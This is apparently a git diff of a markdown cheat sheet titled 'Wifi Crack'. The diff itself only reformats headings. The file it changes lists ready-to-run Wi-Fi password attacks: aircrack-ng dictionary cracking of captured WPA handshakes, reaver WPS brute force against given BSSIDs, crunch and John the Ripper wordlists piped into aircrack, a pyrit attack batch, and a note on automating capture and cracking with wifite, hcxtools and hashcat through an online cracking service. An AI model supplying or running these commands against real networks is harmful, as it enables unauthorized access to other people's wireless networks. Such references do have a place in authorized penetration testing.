@@ -1,26 +1,26 @@
 # Wifi Crack
 
-Aircrack: (Hash)
+## Aircrack: (Hash)
 
 	aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk\*.cap
 
-Reaver: (PSK)
+## Reaver: (PSK)
 
 	reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv
 	reaver -i wlan0mon <replace with yours> -b <bssid> -c <channel no> -K 1 -vv
 
-Crunch & Aircrack:
+## Crunch & Aircrack:
 
 	crunch 8 8 0123456789 -s 00000000 -e 99999999 | aircrack -e test proof.cap -w -
 
-John & Aircrack:
+## John & Aircrack:
 
 	john --wordlist=password.lst --rules=Jumbo --stdout | aircrack-ng -b C0:25:E9:62:CE:E5 psk-01.cap -w -
 
 	https://wpa-sec.stanev.org/
 	https://github.com/danielmiessler/SecLists
 
-Pyrit:
+## Pyrit:
 
 Pyrit is one of the fastest tools available for WPA password-cracking out there.
 
@@ -46,7 +46,7 @@ Final command:
 
 	pyrit -r capture.pcap -o savedpass attack_batch
 
-New Method of Password Cracking:
+## New Method of Password Cracking:
 
 In this case we use Hxctools & Hashcat to capture packets and crack the password but we can do that automaticaly with wifite, if the necessary softwares are installed Wifite will automaticaly use them and give us a URL to upload the modified handshakes. Then the password cracking is performed from connected server online using different password lists.
 
